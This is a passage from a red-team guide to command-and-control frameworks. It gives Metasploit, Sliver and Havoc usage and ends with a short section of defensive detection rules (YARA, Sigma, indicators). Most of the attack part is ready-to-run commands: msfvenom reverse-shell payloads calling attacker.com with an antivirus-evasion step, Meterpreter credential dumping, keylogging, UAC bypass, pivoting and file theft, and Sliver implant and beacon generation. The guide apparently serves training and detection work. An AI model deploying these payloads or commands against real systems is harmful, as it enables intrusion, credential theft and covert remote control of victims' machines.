set ExitOnSession false    # Handle multiple sessions
set EnableStageEncoding true
exploit -j                 # Run in background

# Session management
sessions -l                # List sessions
sessions -i 1              # Interact with session 1
sessions -k 1              # Kill session 1
sessions -u 1              # Upgrade session

# Background operations
background                 # Background current session
jobs -l                    # Running handlers
```

### 3.3 Payload Generation (msfvenom)

```bash
# Windows x64 HTTPS reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.1.100 \
  LPORT=443 \
  -f exe \
  -o payload.exe

# Linux ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.10.10 \
  LPORT=4444 \
  -f elf \
  -o shell

# PowerShell script
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com \
  LPORT=443 \
  -f psh \
  -o payload.ps1

# DLL payload
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com \
  LPORT=443 \
  -f dll \
  -o inject.dll

# Encoding for AV bypass attempt (limited effectiveness)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com \
  LPORT=443 \
  -e x64/xor_dynamic \
  -i 5 \
  -f exe \
  -o encoded.exe
```

### 3.4 Meterpreter Post-Exploitation

```bash
# System information
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getpid
meterpreter> ps

# Privilege escalation
meterpreter> getsystem
meterpreter> use post/multi/recon/local_exploit_suggester
meterpreter> run post/windows/escalate/bypassuac

# Credential collection
meterpreter> hashdump
meterpreter> run post/windows/gather/credentials/credential_collector
meterpreter> load kiwi
meterpreter> creds_all

# Pivot setup
meterpreter> portfwd add -l 3389 -p 3389 -r 192.168.2.10
meterpreter> run post/multi/manage/autoroute

# Screenshot / keylogging
meterpreter> screenshot
meterpreter> keyscan_start
meterpreter> keyscan_dump

# File operations
meterpreter> upload /attacker/nc.exe C:\\Windows\\Temp\\nc.exe
meterpreter> download C:\\Users\\admin\\Documents\\secret.docx
```

---

## 4. Sliver C2

### 4.1 Overview and Features

Sliver is an open-source C2 framework developed by BishopFox, written in Go.

```
Features:
- Fully open source (Apache 2.0)
- mTLS, WireGuard, HTTP/S, DNS support
- Automatic certificate generation
- Cross-platform implants (Windows/Linux/macOS)
- Multiplayer support
```

### 4.2 Installation and Initial Setup

```bash
# Install Sliver server
curl https://sliver.sh/install | sudo bash

# Or build from source
git clone https://github.com/BishopFox/sliver
cd sliver
make

# Run server
sudo sliver-server

# Create operator profile
sliver > new-operator --name operator1 --lhost 10.0.0.1
# → Creates operator1_10.0.0.1.cfg file

# Connect client
sliver-client import operator1_10.0.0.1.cfg
sliver-client
```

### 4.3 Basic Usage

```bash
# Start listeners
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --lhost 0.0.0.0 --lport 443
sliver > dns --domains c2.example.com

# Generate implant
sliver > generate --mtls 10.0.0.1:8888 \
  --os windows \
  --arch amd64 \
  --format exe \
  --save /tmp/implant.exe

# Generate Beacon (periodic callback)
sliver > generate beacon \
  --mtls 10.0.0.1:8888 \
  --seconds 30 \
  --jitter 5 \
  --os linux \
  --save /tmp/beacon

# Session management
sliver > sessions          # List active sessions
sliver > use <sessionID>   # Select session
sliver [session] > info    # System information
sliver [session] > ls      # File listing
sliver [session] > execute whoami
sliver [session] > upload /local/file /remote/path
sliver [session] > download /remote/file
sliver [session] > shell   # Interactive shell

# Pivoting
sliver [session] > pivots tcp --lport 9999
sliver > generate --tcp-pivot 10.0.0.2:9999 --save pivot.exe
```

---

## 5. Havoc Framework

### 5.1 Overview

Havoc is a modern C2 framework and an open-source alternative to Cobalt Strike.

```
Components:
- Teamserver: Go-based C2 server
- Havoc Client: Qt-based GUI
- Demon: C/ASM-based implant
- Phantom: additional implant option

Features:
- Sleep Obfuscation support
- Built-in AMSI/ETW bypass
- Various process injection techniques
- Kerberos attack support
```

### 5.2 Basic Configuration

```yaml
# config.yaotl (team server configuration)
Teamserver {
    Host = "0.0.0.0"
    Port = 40056
    Build {
        Compiler64 = "x86_64-w64-mingw32-gcc"
        Compiler86 = "i686-w64-mingw32-gcc"
    }
}

Operators {
    user "operator1" {
        Password = "SecurePass!"
    }
}

Listeners {
    Http {
        Name = "MainHTTPS"
        Hosts = ["attacker.com"]
        HostBind = "0.0.0.0"
        PortBind = 443
        Secure = true
    }
}
```

---

## 6. HTTP/HTTPS/DNS/SMB C2 Channel Details

### 6.1 HTTP C2

```
Request pattern:
  GET /updates/check?id=<encoded agentID> HTTP/1.1
  Host: legitimate-looking.com
  User-Agent: Mozilla/5.0 ...

Response pattern:
  HTTP/1.1 200 OK
  Content-Type: application/json
  {"status": "ok", "data": "<base64-encoded command>"}

Detection indicators:
  - Abnormally regular polling patterns
  - Non-standard User-Agent
  - Unencrypted beacon traffic
  - Abnormal Content-Type
```

### 6.2 DNS C2

```
How it works:
  Agent → DNS query (TXT/A record) → C2 server
  
  # Command delivery (server → agent)
  <encoded>.<domain>.c2.attacker.com  TXT "Y21kOiB3aG9hbWk="

  # Result return (agent → server)  
  <result chunk>.<sessionID>.<domain>.c2.attacker.com

DNS C2 tools:
  - dnscat2 (open source)
  - iodine (DNS tunneling)
  - Cobalt Strike DNS Beacon

Detection indicators:
  - Abnormally long DNS queries
  - High DNS query frequency
  - Many TXT record queries
  - NXDOMAIN response patterns
```

### 6.3 SMB Named Pipe C2

```
Use cases:
  - Internal network pivot point
  - Control systems without internet connectivity
  - Network segmentation bypass

Architecture:
  [External Agent] ←HTTPS→ [C2 Server]
       ↕ SMB Named Pipe
  [Internal Pivot Agent] ←Named Pipe→ [Internal Targets]

Named Pipe path examples:
  \\.\pipe\MSSE-1234-server  (Cobalt Strike default)
  \\.\pipe\msagent_1234
  \\.\pipe\postex_1234
```

---

## 7. Python Educational HTTP C2 Server/Agent Implementation

### 7.1 C2 Server

```python
#!/usr/bin/env python3
"""
Simple educational HTTP C2 server implementation
Purpose: Understanding C2 communication principles (CTF/educational environments only)
"""
# (See Korean section for full source code — identical implementation with Korean comments translated)
```

### 7.2 C2 Agent (Educational)

```python
#!/usr/bin/env python3
"""
Educational HTTP C2 agent
CTF/educational environments only — do not use for unauthorized purposes
"""
# (See Korean section for full source code — identical implementation)
```

---

## 8. C2 Traffic Detection (Blue Team Perspective)

### 8.1 Network-Based Detection

```
Detection Method 1: Beaconing Pattern Analysis
  - Regular connections to same destination (e.g., every 30 seconds)
  - No data exchange after connection establishment
  - Abnormally consistent packet sizes

Detection Method 2: JA3/JA3S Fingerprinting
  - Identify C2 tools via TLS ClientHello parameters
  - Blacklist known Cobalt Strike/Metasploit JA3 hashes

Detection Method 3: DNS Analysis
  - High-entropy domains (DGA detection)
  - Abnormally long subdomains
  - Bulk TXT record queries

Detection Method 4: Beacon Timing Analysis
  # Low standard deviation in time intervals indicates automated beaconing
  import statistics
  intervals = [29.8, 30.1, 29.9, 30.2, 30.0]
  std_dev = statistics.stdev(intervals)
  # std_dev < 1.0 is suspicious
```

### 8.2 Host-Based Detection

```
Detection Indicators (IOC):
  Processes:
  - rundll32.exe → network connections
  - powershell.exe -enc <base64>
  - mshta.exe → external URL access
  - wscript.exe / cscript.exe → abnormal paths

  Registry:
  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  - Abnormal service registration

  Memory:
  - Executable memory regions (RWX)
  - Executable code not on disk
  - Abnormal PE headers (Reflective DLL)

Detection Tools:
  - Sysmon (event logging)
  - Volatility (memory analysis)
  - YARA rules (Beacon pattern matching)
  - EDR solutions (CrowdStrike, SentinelOne)
```

### 8.3 YARA Detection Rule Examples

```yara
rule CobaltStrike_Beacon {
    meta:
        description = "Cobalt Strike Beacon memory pattern"
    strings:
        $mz = { 4D 5A }
        $cs1 = "%02d/%02d/%02d %02d:%02d:%02d"
        $cs2 = "ReflectiveLoader"
        $cs3 = { FC E8 89 00 00 00 60 89 E5 31 D2 }
    condition:
        $mz at 0 and ($cs2 or ($cs1 and $cs3))
}

rule Generic_HTTP_Beacon {
    meta:
        description = "Generic HTTP beaconing pattern"
    strings:
        $ua1 = "Mozilla/5.0" ascii
        $beacon1 = "sleep" ascii nocase
        $beacon2 = "checkin" ascii nocase
        $beacon3 = "callback" ascii nocase
    condition:
        $ua1 and 2 of ($beacon*)
}
```

### 8.4 Sigma Detection Rules

```yaml
title: C2 Beaconing DNS Pattern Detection
status: experimental
description: Detect suspicious DNS C2 communication patterns
logsource:
    category: dns
detection:
    selection:
        dns.query.name|re: '^[a-z0-9]{20,}\.'
    timeframe: 1m
    condition: selection | count() > 50
falsepositives:
    - CDN domains
    - Legitimate high-entropy domains
level: medium
tags:
    - attack.command_and_control
    - attack.t1071.004
```

---

## References

- MITRE ATT&CK: TA0011 Command and Control
- Cobalt Strike Documentation (official)
- Sliver GitHub: https://github.com/BishopFox/sliver
- Havoc Framework GitHub
- "The C2 Matrix" project (c2matrix.com)
